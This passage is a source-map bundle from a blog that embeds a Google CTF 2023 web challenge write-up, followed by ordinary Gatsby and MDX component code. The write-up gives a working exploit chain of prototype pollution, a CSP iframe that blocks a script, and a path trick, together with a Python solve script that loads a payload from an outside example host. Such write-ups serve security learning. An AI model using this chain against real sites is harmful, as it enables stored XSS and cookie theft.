safeScriptEl.setSrc(script, trustedResourceUrl(editor));\\n  document.body.appendChild(script);\\n}\\n\\nwindow.addEventListener('DOMContentLoaded', () => {\\n  render();\\n  if (!location.pathname.startsWith('/view/')) {\\n    loadEditorResources();\\n  }\\n});\\n\")), \"\\n\", React.createElement(_components.p, null, \"And it gets the \", React.createElement(_components.code, null, \"editor\"), \" variable from \", React.createElement(_components.code, null, \"bootstrap.js\"), \".\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, {\n    className: \"language-js\"\n  }, \"if (!location.pathname.startsWith('/view/')) {\\n  [...]\\n  editor = (x=>x)`/static/editor.js`;\\n}\\n\")), \"\\n\", React.createElement(_components.p, null, \"Let's walkthrough this excerpt of \", React.createElement(_components.code, null, \"main.js\"), \" code step-by-step to understand its control flow. Once the \", React.createElement(_components.code, null, \"DOMContentLoaded\"), \" event is triggered, we call the \", React.createElement(_components.code, null, \"render()\"), \" function and then conditionally call the \", React.createElement(_components.code, null, \"loadEditorResources()\"), \" function if the \", React.createElement(_components.code, null, \"location.pathname\"), \" does not start with \", React.createElement(_components.code, null, \"/view/\"), \". Specifically, we are interesting in the last three lines of this function. Firstly, a script element is created and then we use the \", React.createElement(_components.a, {\n    href: \"https://github.com/google/safevalues/blob/main/src/dom/xss-dom-remediation.md#assigning-to-htmlscriptelementsrc-\"\n  }, React.createElement(_components.code, null, \"safeScriptEl.setSrc()\")), \" to set the src of the script element. The source of the script must be of type \", React.createElement(_components.code, null, \"trustedResourceUrl\"), \". Reading the \", React.createElement(_components.a, {\n    href: \"https://github.com/google/safevalues/tree/main/src#trustedresourceurl\"\n  }, \"documentation of TrustedResourceUrl\"), \", I learned that we can construct a \", React.createElement(_components.code, null, \"trustedResourceUrl\"), \" by using a \", React.createElement(_components.a, {\n    href: \"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#tagged_templates\"\n  }, \"tagged template function\"), \" like so: \", React.createElement(_components.code, null, \"trustedResourceUrl`/static/editor.js`\"), \". However, this is just syntactic sugar for the following: \", React.createElement(_components.code, null, \"trustedResourceUrl([\\\"/static/editor.js\\\"])\"), \". Finally, the script element with its src is appended to the \", React.createElement(_components.code, null, \"document.body\"), \".\"), \"\\n\", React.createElement(_components.p, null, \"So, now all that we need to do is set the \", React.createElement(_components.code, null, \"editor\"), \" variable (the argument passed to \", React.createElement(_components.code, null, \"trustedResourceUrl()\"), \") to point to our malicious JavaScript code and we would have a complete XSS vulnerability. And although we do have a prototype vulnerability that we can and will use to control the \", React.createElement(_components.code, null, \"editor\"), \" variable, it would be overwritten in \", React.createElement(_components.code, null, \"bootstrap.js\"), \".\"), \"\\n\", React.createElement(_components.h3, null, \"Blocking \", React.createElement(_components.code, null, \"bootstrap.js\")), \"\\n\", React.createElement(_components.p, null, \"Well, once we find a way to overwrite the \", React.createElement(_components.code, null, \"editor\"), \" variable, we still need to get rid of the pesky \", React.createElement(_components.code, null, \"bootstrap.js\"), \" which would overwrite it. A neat trick that we can use is an iframe and use the csp attribute to enforce a content security policy on the embedded document (note this is once again an experimental feature only present in Chrome 61+ but not in Firefox or Safari). So we could use the following iframe to block  \", React.createElement(_components.code, null, \"bootstrap.js\"), \" from being loaded in the document in the iframe.\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, {\n    className: \"language-js\"\n  }, \"<iframe src=\\\"https://biohazard-web.2023.ctfcompetition.com/view/[bio_uuid]\\\" csp=\\\"script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'\\\"></iframe>\\n\")), \"\\n\", React.createElement(_components.h3, null, \"Overwriting the \", React.createElement(_components.code, null, \"editor\"), \" variable and getting the XSS\"), \"\\n\", React.createElement(_components.p, null, \"Although the ultimate goal for this challenge is to exfiltrate the bot's \", React.createElement(_components.code, null, \"document.cookie\"), \", as a proof of concept, we will just execute \", React.createElement(_components.code, null, \"alert()\"), \" and \", React.createElement(_components.code, null, \"console.log()\"), \". I use the following snippet of JavaScript as the payload.\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, {\n    className: \"language-js\"\n  }, \"alert(`payload.js says: ${window.origin}`)\\nconsole.log(`payload.js says: ${window.origin}`)\\n\")), \"\\n\", React.createElement(_components.p, null, \"I used the prototype pollution we explored earlier to maliciously control the \", React.createElement(_components.code, null, \"editor\"), \" variable and point to my malicious JavaScript file. This bio will then be iframed so that the script pointed to by \", React.createElement(_components.code, null, \"editor\"), \" is run while \", React.createElement(_components.code, null, \"bootstrap.js\"), \" remains blocked. It is also important to note that since our persistent XSS is on \", React.createElement(_components.code, null, \"/view/[bio_uuid]\"), \", we need a way for \", React.createElement(_components.code, null, \"loadEditorResources()\"), \" to be called (since it is not called when the pathname starts with \", React.createElement(_components.code, null, \"/view/\"), \"). The trick is to use \", React.createElement(_components.code, null, \"/foo/view/[bio_uuid]\"), \". The reason this works is because, a) the pathname no longer starts \", React.createElement(_components.code, null, \"/view/\"), \" and b) this is a single page application that discards everything in the pathname before \", React.createElement(_components.code, null, \"/view/\"), \" and treats everything after it as the bio UUID. Lastly, we use the prototype pollution vulnerability to bypass the Closure sanitizer and allow the iframe to also have the CSP attribute.\"), \"\\n\", React.createElement(_components.p, null, \"I wrote the following Python script to create the first bio which overwrites the \", React.createElement(_components.code, null, \"editor\"), \" and the second bio which iframes the first one with the specific CSP.\"), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, {\n    className: \"language-py\"\n  }, \"#!/usr/bin/env python\\nimport requests\\n\\nURL = \\\"https://biohazard-web.2023.ctfcompetition.com\\\"\\n\\nheaders = {\\n    'content-type': 'application/json',\\n}\\n\\nfirst_id = requests.post(f\\\"{URL}/create\\\", headers=headers, json={\\\"name\\\":\\\"test\\\",\\\"introduction\\\":\\\"\\\",\\\"favorites\\\":{\\\"hobbies\\\":\\\"\\\",\\\"sports\\\":\\\"\\\"}, \\\"__proto__\\\": {\\\"editor\\\": [\\\"http://flyme2bluemoon.example/payload.js\\\"]}}).json()[\\\"id\\\"]\\n\\nprint(f\\\"iframe url: {URL}/view/{first_id}\\\")\\n\\ndata=f'{{\\\"name\\\":\\\"test\\\",\\\"introduction\\\":\\\"<iframe src=\\\\\\\\\\\"{URL}/foo/view/{first_id}\\\\\\\\\\\" csp=\\\\\\\\\\\"script-src http://flyme2bluemoon.example/payload.js {URL}/static/closure-library/ {URL}/static/sanitizer.js {URL}/static/main.js \\\\'unsafe-inline\\\\' \\\\'unsafe-eval\\\\'\\\\\\\\\\\"></iframe>\\\",\\\"favorites\\\":{{\\\"hobbies\\\":\\\"\\\",\\\"sports\\\":\\\"\\\"}}, \\\"__proto__\\\": {{\\\"IFRAME CSP\\\": true}}}}'\\nsecond_id = requests.post(f\\\"{URL}/create\\\", headers=headers, data=data).json()[\\\"id\\\"]\\n\\nprint(f\\\"report url: {URL}/view/{second_id}\\\")\\n\")), \"\\n\", React.createElement(_components.pre, null, React.createElement(_components.code, {\n    className: \"language-sh\"\n  }, \"┌──(mshen㉿kali)-[~/gctf-2023/biohazard/solution]\\n└─$ ./solve.py\\niframe url: https://biohazard-web.2023.ctfcompetition.com/view/e96118c6-75bc-44bf-a62e-f1ef2fdae1f7\\nreport url: https://biohazard-web.2023.ctfcompetition.com/view/9c1c9720-f454-4a68-b7f3-bcf9f058ffd9\\n\")), \"\\n\", React.createElement(_components.h2, null, \"Conclusion\"), \"\\n\", React.createElement(_components.p, null, \"Even though I was not able to solve this challenge during the official Google CTF time period, it was really fun to work through it after the fact. Thanks to \", React.createElement(_components.a, {\n    href: \"https://twitter.com/shhnjk\"\n  }, \"Jun Kokatsu (@shhnjk)\"), \" for putting together this realistic challenge. As stated in the purpose section of the solution, I love how this challenge mimics a common setup used by production systems at Alphabet (Google). Itt was great to review some concepts I previously knew, rediscover how they can be leveraged in different ways and to learn about completely new web vulnerabilites.\"));\n}\nfunction MDXContent(props = {}) {\n  const {wrapper: MDXLayout} = Object.assign({}, _provideComponents(), props.components);\n  return MDXLayout ? React.createElement(MDXLayout, props, React.createElement(_createMdxContent, props)) : _createMdxContent(props);\n}\nexport default MDXContent;\n","import GATSBY_COMPILED_MDX from \"/home/runner/work/flyme2bluemoon.github.io/flyme2bluemoon.github.io/blog/gctf-2023-web-biohazard.mdx\";\nimport React from \"react\";\nimport Layout from \"../../../components/layout\";\nimport {Link} from \"gatsby\";\nconst query = \"503612602\";\nconst Post = _ref => {\n  let {data: {mdx}, children} = _ref;\n  return React.createElement(Layout, {\n    pageTitle: mdx.frontmatter.title\n  }, React.createElement(\"div\", {\n    className: \"lg:w-3/5 md:w-4/5 mx-auto px-3 my-8\"\n  }, React.createElement(\"h1\", {\n    className: \"font-bold text-4xl md:text-6xl py-5\"\n  }, mdx.frontmatter.title), React.createElement(\"div\", null, React.createElement(\"div\", null, React.createElement(\"div\", {\n    className: \"flex\"\n  }, React.createElement(\"span\", {\n    className: \"mr-1 flex\"\n  }, mdx.frontmatter.date), React.createElement(\"span\", {\n    className: \"mx-1 flex\"\n  }))), React.createElement(\"div\", {\n    className: \"py-5 prose prose-xl dark:prose-invert max-w-none prose-code:before:content-none prose-code:after:content-none\"\n  }, children), React.createElement(\"div\", null, React.createElement(\"span\", {\n    className: \"font-semibold\"\n  }, \"Tagged in:\"), \" \", mdx.frontmatter.tags.map(tag => React.createElement(Link, {\n    to: \"/blog/tags/\" + tag.toLowerCase() + \"/\",\n    className: \"underline mr-1\"\n  }, tag))))));\n};\nPost\nexport default function GatsbyMDXWrapper(props) {\n  return React.createElement(Post, props, React.createElement(GATSBY_COMPILED_MDX, props));\n}\n","/**\n * @typedef {import('react').ReactNode} ReactNode\n * @typedef {import('mdx/types.js').MDXComponents} Components\n *\n * @typedef Props\n *   Configuration.\n * @property {Components | MergeComponents | null | undefined} [components]\n *   Mapping of names for JSX components to React components.\n * @property {boolean | null | undefined} [disableParentContext=false]\n *   Turn off outer component context.\n * @property {ReactNode | null | undefined} [children]\n *   Children.\n *\n * @callback MergeComponents\n *   Custom merge function.\n * @param {Components} currentComponents\n *   Current components from the context.\n * @returns {Components}\n *   Merged components.\n */\n\nimport React from 'react'\n\n/**\n * @type {import('react').Context<Components>}\n * @deprecated\n *   This export is marked as a legacy feature.\n *   That means it’s no longer recommended for use as it might be removed\n *   in a future major release.\n *\n *   Please use `useMDXComponents` to get context based components and\n *   `MDXProvider` to set context based components instead.\n */\nexport const MDXContext = React.createContext({})\n\n/**\n * @param {import('react').ComponentType<any>} Component\n * @deprecated\n *   This export is marked as a legacy feature.\n *   That means it’s no longer recommended for use as it might be removed\n *   in a future major release.\n *\n *   Please use `useMDXComponents` to get context based components instead.\n */\nexport function withMDXComponents(Component) {\n  return boundMDXComponent\n\n  /**\n   * @param {Record<string, unknown> & {components?: Components | null | undefined}} props\n   * @returns {JSX.Element}\n   */\n  function boundMDXComponent(props) {\n    const allComponents = useMDXComponents(props.components)\n    return React.createElement(Component, {...props, allComponents})\n  }\n}\n\n/**\n * Get current components from the MDX Context.\n *\n * @param {Components | MergeComponents | null | undefined} [components]\n *   Additional components to use or a function that takes the current\n *   components and filters/merges/changes them.\n * @returns {Components}\n *   Current components.\n */\nexport function useMDXComponents(components) {\n  const contextComponents = React.useContext(MDXContext)\n\n  // Memoize to avoid unnecessary top-level context changes\n  return React.useMemo(() => {\n    // Custom merge via a function prop\n    if (typeof components === 'function') {\n      return components(contextComponents)\n    }\n\n    return {...contextComponents, ...components}\n  }, [contextComponents, components])\n}\n\n/** @type {Components} */\nconst emptyObject = {}\n\n/**\n * Provider for MDX context\n *\n * @param {Props} props\n * @returns {JSX.Element}\n */\nexport function MDXProvider({components, children, disableParentContext}) {\n  /** @type {Components} */\n  let allComponents\n\n  if (disableParentContext) {\n    allComponents =\n      typeof components === 'function'\n        ? components({})\n        : components || emptyObject\n  } else {\n    allComponents = useMDXComponents(components)\n  }\n\n  return React.createElement(\n    MDXContext.Provider,\n    {value: allComponents},\n    children\n  )\n}\n"],"names":["_createMdxContent","props","_components","Object","assign","p","code","br","hr","h2","a","em","pre","h3","_provideComponents","components","React","href","className","wrapper","MDXLayout","Post","_ref","data","mdx","children","Layout","pageTitle","frontmatter","title","date","tags","map","tag","Link","to","toLowerCase","GatsbyMDXWrapper","GATSBY_COMPILED_MDX","MDXContext","useMDXComponents","contextComponents"],"sourceRoot":""}